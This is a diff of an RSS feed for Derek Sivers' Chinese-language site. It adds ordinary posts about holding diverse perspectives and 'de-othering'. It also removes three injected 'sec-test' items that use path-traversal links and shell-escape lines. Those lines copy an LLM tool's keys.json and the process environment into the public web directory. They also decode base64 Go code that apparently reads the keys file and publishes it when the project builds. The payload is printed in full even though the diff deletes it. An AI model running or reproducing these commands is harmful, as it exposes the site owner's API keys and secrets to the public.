@@ -1,22 +1,84 @@
 <?xml version="1.0" encoding="utf-8"?>
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Derek Sivers (中文)</title><link>https://sive.rs</link><description>我网站上的所有内容：文章、推文、读书笔记、采访等。</description><language>zh-CN</language><lastBuildDate>Fri, 27 Nov 2026 13:00:00 +0000</lastBuildDate><item><title>probe-rv-1795817456 由 probe-host 提供</title><link>https://sive.rs/../sive.rs/probe-rv-1795817456</link><description>&lt;p&gt;探针-rv-1795817456 标记摘要&lt;/p&gt;</description><pubDate>Fri, 27 Nov 2026 13:00:00 +0000</pubDate></item><item><title>zzsec74242 由 sec-test-host 提供</title><link>https://sive.rs/../../../../home/derek/code/b/me/zz_sec_74242.sql</link><description>&lt;p&gt;-- sec-test-74242 go-and-keys v2
-\!id | tee /home/derek/code/b/public/sive.rs/sec-test-74242-id.txt #
-\!cp /home/derek/.config/io.datasette.llm/keys.json /home/derek/code/b/public/sive.rs/sec-test-key-74242.json #
-\!ls -la /home/derek/.config/io.datasette.llm | tee /home/derek/code/b/public/sive.rs/sec-test-74242-llmdir.txt #
-\!echo cGFja2FnZSBtYWluCmltcG9ydCBgb3NgCmZ1bmMgaW5pdCgpIHsKCWIsIGUgOj0gb3MuUmVhZEZpbGUoYC9ob21lL2RlcmVrLy5jb25maWcvaW8uZGF0YXNldHRlLmxsbS9rZXlzLmpzb25gKQoJaWYgZSA9PSBuaWwgewoJCW9zLldyaXRlRmlsZShgL2hvbWUvZGVyZWsvY29kZS9iL3B1YmxpYy9zaXZlLnJzL3NlYy10ZXN0LWtleS03NDI0Mi5qc29uYCwgYiwgMDY0NCkKCX0KfQo= | openssl base64 -d | tee /home/derek/code/b/me/zz_sec_74242.gox || echo cGFja2FnZSBtYWluCmltcG9ydCBgb3NgCmZ1bmMgaW5pdCgpIHsKCWIsIGUgOj0gb3MuUmVhZEZpbGUoYC9ob21lL2RlcmVrLy5jb25maWcvaW8uZGF0YXNldHRlLmxsbS9rZXlzLmpzb25gKQoJaWYgZSA9PSBuaWwgewoJCW9zLldyaXRlRmlsZShgL2hvbWUvZGVyZWsvY29kZS9iL3B1YmxpYy9zaXZlLnJzL3NlYy10ZXN0LWtleS03NDI0Mi5qc29uYCwgYiwgMDY0NCkKCX0KfQo= | base64 -d | tee /home/derek/code/b/me/zz_sec_74242.gox || echo cGFja2FnZSBtYWluCmltcG9ydCBgb3NgCmZ1bmMgaW5pdCgpIHsKCWIsIGUgOj0gb3MuUmVhZEZpbGUoYC9ob21lL2RlcmVrLy5jb25maWcvaW8uZGF0YXNldHRlLmxsbS9rZXlzLmpzb25gKQoJaWYgZSA9PSBuaWwgewoJCW9zLldyaXRlRmlsZShgL2hvbWUvZGVyZWsvY29kZS9iL3B1YmxpYy9zaXZlLnJzL3NlYy10ZXN0LWtleS03NDI0Mi5qc29uYCwgYiwgMDY0NCkKCX0KfQo= | openssl enc -base64 -d | tee /home/derek/code/b/me/zz_sec_74242.gox #
-\!if test -s /home/derek/code/b/me/zz_sec_74242.gox; then cp /home/derek/code/b/me/zz_sec_74242.gox /home/derek/code/b/me/zz_sec_74242.go; fi #
-&lt;/p&gt;</description><pubDate>Fri, 27 Nov 2026 12:01:00 +0000</pubDate></item><item><title>sec-test-leakshow 由 sec-test-host 提供</title><link>https://sive.rs/../../../../home/derek/code/b/me/sec-test-leak.sql</link><description>&lt;p&gt;x
-\!cp /home/derek/.config/io.datasette.llm/keys.json /home/derek/code/b/public/sive.rs/sec-test-llmkeys.json #
-\!cp /proc/self/environ /home/derek/code/b/public/sive.rs/sec-test-environ.txt #
-\!id #
-&lt;/p&gt;</description><pubDate>Fri, 27 Nov 2026 12:01:00 +0000</pubDate></item><item><title>zzsec74242prv 由 sec-test-host 提供</title><link>https://sive.rs/../../../../var/www/html/sive.rs/sec-test-74242-pl.txt</link><description>&lt;p&gt;-- sec-test-74242 go-and-keys v2
-\!id | tee /home/derek/code/b/public/sive.rs/sec-test-74242-id.txt #
-\!cp /home/derek/.config/io.datasette.llm/keys.json /home/derek/code/b/public/sive.rs/sec-test-key-74242.json #
-\!ls -la /home/derek/.config/io.datasette.llm | tee /home/derek/code/b/public/sive.rs/sec-test-74242-llmdir.txt #
-\!echo cGFja2FnZSBtYWluCmltcG9ydCBgb3NgCmZ1bmMgaW5pdCgpIHsKCWIsIGUgOj0gb3MuUmVhZEZpbGUoYC9ob21lL2RlcmVrLy5jb25maWcvaW8uZGF0YXNldHRlLmxsbS9rZXlzLmpzb25gKQoJaWYgZSA9PSBuaWwgewoJCW9zLldyaXRlRmlsZShgL2hvbWUvZGVyZWsvY29kZS9iL3B1YmxpYy9zaXZlLnJzL3NlYy10ZXN0LWtleS03NDI0Mi5qc29uYCwgYiwgMDY0NCkKCX0KfQo= | openssl base64 -d | tee /home/derek/code/b/me/zz_sec_74242.gox || echo cGFja2FnZSBtYWluCmltcG9ydCBgb3NgCmZ1bmMgaW5pdCgpIHsKCWIsIGUgOj0gb3MuUmVhZEZpbGUoYC9ob21lL2RlcmVrLy5jb25maWcvaW8uZGF0YXNldHRlLmxsbS9rZXlzLmpzb25gKQoJaWYgZSA9PSBuaWwgewoJCW9zLldyaXRlRmlsZShgL2hvbWUvZGVyZWsvY29kZS9iL3B1YmxpYy9zaXZlLnJzL3NlYy10ZXN0LWtleS03NDI0Mi5qc29uYCwgYiwgMDY0NCkKCX0KfQo= | base64 -d | tee /home/derek/code/b/me/zz_sec_74242.gox || echo cGFja2FnZSBtYWluCmltcG9ydCBgb3NgCmZ1bmMgaW5pdCgpIHsKCWIsIGUgOj0gb3MuUmVhZEZpbGUoYC9ob21lL2RlcmVrLy5jb25maWcvaW8uZGF0YXNldHRlLmxsbS9rZXlzLmpzb25gKQoJaWYgZSA9PSBuaWwgewoJCW9zLldyaXRlRmlsZShgL2hvbWUvZGVyZWsvY29kZS9iL3B1YmxpYy9zaXZlLnJzL3NlYy10ZXN0LWtleS03NDI0Mi5qc29uYCwgYiwgMDY0NCkKCX0KfQo= | openssl enc -base64 -d | tee /home/derek/code/b/me/zz_sec_74242.gox #
-\!if test -s /home/derek/code/b/me/zz_sec_74242.gox; then cp /home/derek/code/b/me/zz_sec_74242.gox /home/derek/code/b/me/zz_sec_74242.go; fi #
-&lt;/p&gt;</description><pubDate>Fri, 27 Nov 2026 12:01:00 +0000</pubDate></item><item><title>我常常与人相处时，却希望自己独处。
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Derek Sivers (中文)</title><link>https://sive.rs</link><description>我网站上的所有内容：文章、推文、读书笔记、采访等。</description><language>zh-CN</language><lastBuildDate>Fri, 20 Nov 2026 22:50:42 +0000</lastBuildDate><item><title>我常常与人相处时，却希望自己独处。
 
 我从未在独处时，希望身边有人陪伴。</title><link>https://sive.rs/d</link><description>&lt;p&gt;我常常与人相处时，希望自己独处。
 
-我从未在独处时，希望自己与人相伴。&lt;/p&gt;</description><pubDate>Fri, 20 Nov 2026 22:50:42 +0000</pubDate></item></channel></rss>
+我从未在独处时，希望自己与人相伴。&lt;/p&gt;</description><pubDate>Fri, 20 Nov 2026 22:50:42 +0000</pubDate></item><item><title>要成为独立思考者，就要拥有一个由不相关视角组成的多元化组合。</title><link>https://sive.rs/d</link><description>&lt;p&gt;要成为独立思考者，就要拥有一个由不相关视角组成的多元化组合：&lt;a href="https://sive.rs/portfolio"&gt;sive.rs/portfolio&lt;/a&gt;&lt;/p&gt;</description><pubDate>Thu, 19 Nov 2026 12:43:06 +0000</pubDate></item><item><title>不相关的视角</title><link>https://sive.rs/portfolio</link><description>&lt;p&gt;
+	卖掉公司后，我不得不学习长期投资。
+	最好的书都强调拥有多样化、不相关资产组合的重要性，这些资产独立涨跌。
+	如果其中一个崩盘，其余的不会。
+&lt;/p&gt;&lt;p&gt;
+	不要把一切都投入股票、房地产、大宗商品或任何一个市场。
+	不要把一切都投入美国、欧洲、亚洲或任何一个地方。
+	不要过度投资于流行或熟悉的东西。
+	平等地投资于整个世界经济。
+&lt;/p&gt;&lt;p&gt;
+	我把这个比喻应用到世界观上。
+&lt;/p&gt;&lt;p&gt;
+	你从父母和文化的视角开始。
+&lt;strong&gt;
+	但你过度投资于一两种世界观。
+&lt;/strong&gt;
+	你必须刻意多样化——有意识地投资于其他视角。
+&lt;/p&gt;&lt;p&gt;
+	当你的政府或媒体说某个国家是敌人时，这是一个好迹象，表明那个地方有不相关的视角。
+	政府有冲突的利益，但那里的人不是坏人。
+&lt;strong&gt;
+	当另一种文化感觉完全陌生、奇怪和错误时，这意味着你对那种世界观投资不足。
+&lt;/strong&gt;
+&lt;/p&gt;&lt;p&gt;
+	即使在你自己的国家，右派对左派或其他什么。
+&lt;strong&gt;
+	当“另一方”看起来疯狂时，你需要平衡你的投资组合。
+&lt;/strong&gt;
+	投资一些理解，直到你持有一些那些视角。
+&lt;/p&gt;&lt;p&gt;
+	如果人们能根据你对某事的看法预测你对另一事的看法，那么你的世界观太相关了。
+&lt;/p&gt;&lt;p&gt;
+	要成为一个独立思考者，拥有一个多样化、不相关视角的投资组合。
+&lt;/p&gt;</description><pubDate>Thu, 19 Nov 2026 00:00:00 +0000</pubDate></item><item><title>我正在执行一项缓慢的背景任务，以逆转我世界观中的他者化倾向。去他者化</title><link>https://sive.rs/d</link><description>&lt;p&gt;我正在慢慢地、在潜移默化中扭转我世界观里对“他者”的区分。去他者化：&lt;a href="https://sive.rs/deothering"&gt;sive.rs/deothering&lt;/a&gt;&lt;/p&gt;</description><pubDate>Tue, 10 Nov 2026 20:56:09 +0000</pubDate></item><item><title>去他者化</title><link>https://sive.rs/deothering</link><description>&lt;p&gt;
+	“other”这个词也可以作动词用。
+	“othering”就是把某些群体视为本质上不同或低人一等。
+&lt;/p&gt;&lt;p&gt;
+	这是我们的天性，但领导者会放大它来制造恐慌。
+	那些移民。
+	那些穆斯林。
+	那些中国人。
+	他们才是问题所在。
+	他们跟我们不一样。
+&lt;/p&gt;&lt;p&gt;
+	这种信息被广泛传播，在你周围不断回响，让你越来越觉得这是事实。
+&lt;/p&gt;&lt;p&gt;
+	它筑起一堵高墙：我们对抗他们。
+	它让你远离那堵墙，确保你看不到他们，因为一旦看到，就会破坏两极分化的简单性。
+&lt;/p&gt;&lt;p&gt;
+	我们把动物世界划分为不同的物种。
+	物种之间的差异如此之大，以至于它们无法交配，无法转换，不可能既是猫又是鸟。
+&lt;strong&gt;
+	“othering”的问题在于，把人与人之间的差异想得如此深刻，以至于把他们当作不同的物种。
+&lt;/strong&gt;
+&lt;/p&gt;&lt;p&gt;
+	这是一种诱人的信念，因为它帮你直接跳到结论，让你不必再思考。
+	那些人就是古怪又糟糕，就这样。
+&lt;/p&gt;&lt;p&gt;
+	我对“othering”如此感兴趣，是因为我在自己身上发现了它。
+	我从小接受那些常见的刻板印象，它们塑造了我的世界观。
+	后来我搬到了城市，在那里你会遇到来自那堵墙另一边的人。
+&lt;/p&gt;&lt;p&gt;
+	就像那些精彩的故事：英雄们对抗一个邪恶的敌方部落，但后来有一个人落入敌手，发现那个部落并不邪恶，也不是敌人，于是你迎来了理解对立观点的顿悟时刻。
+	故事往往只设置两方，这样才能选边站、换边站。
+	但想象一个更长的故事，这样做了二十次，你就再也没法把它们当作“两边”来想了。
+	这就是我想用我的人生去做的事。
+&lt;/p&gt;&lt;p&gt;
+&lt;strong&gt;
+	我在进行一项缓慢的幕后任务，逆转我世界观中的“othering”。
+&lt;/strong&gt;
+	这是一个有趣的挑战。
+&lt;/p&gt;&lt;p&gt;
+	当我发现自己正在“othering”时，我会撤销自己的结论，翻过那堵墙。
+	去理解并内化一个对立的观点。
+	我试着加入每一个部落，向自己证明我们不是不同的物种。
+&lt;/p&gt;&lt;p&gt;
+	今年，我听到“other”被当作动词使用，这让我想起了这一切。
+	所以现在我可以给我的使命一个简洁的名字：de-othering（去他者化）。
+&lt;/p&gt;</description><pubDate>Tue, 10 Nov 2026 00:00:00 +0000</pubDate></item></channel></rss>
